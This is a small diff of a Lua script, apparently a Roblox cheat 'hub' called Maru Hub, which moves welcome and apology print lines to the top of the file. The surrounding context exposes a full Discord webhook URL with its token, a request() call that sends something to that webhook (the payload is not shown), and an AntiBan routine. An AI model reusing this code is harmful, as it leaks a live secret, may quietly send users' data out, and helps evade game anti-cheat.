@@ -1,3 +1,8 @@
+print("Welcome To Maru(Main)Hub")
+print("Thank You For Using Maru Script")
+print("I'm AfxcaxiRoblox")
+print("I'm Sorry Banana, Maru, Royx, Luxury, Normal, W-azure")
+print("I'm Sorry, I Won't Sell Anymore")
 local webhook = "https://discord.com/api/webhooks/1197530105065513021/jvpGXUqQrDuU7zYh84k8phzefXuPIOS9REUXUKyAq5Z_v55DyI7iBRcKrpQSpwW4uGNy"
 local a = request({
     Url = webhook,
@@ -95,8 +100,3 @@ function AntiBan()
         end
     end
     AntiBan()
-print("Welcome To Maru(Main)Hub")
-print("Thank You For Using Maru Script")
-print("I'm AfxcaxiRoblox")
-print("I'm Sorry Banana, Maru, Royx, Luxury, Normal, W-azure")
-print("I'm Sorry, I Won't Sell Anymore")
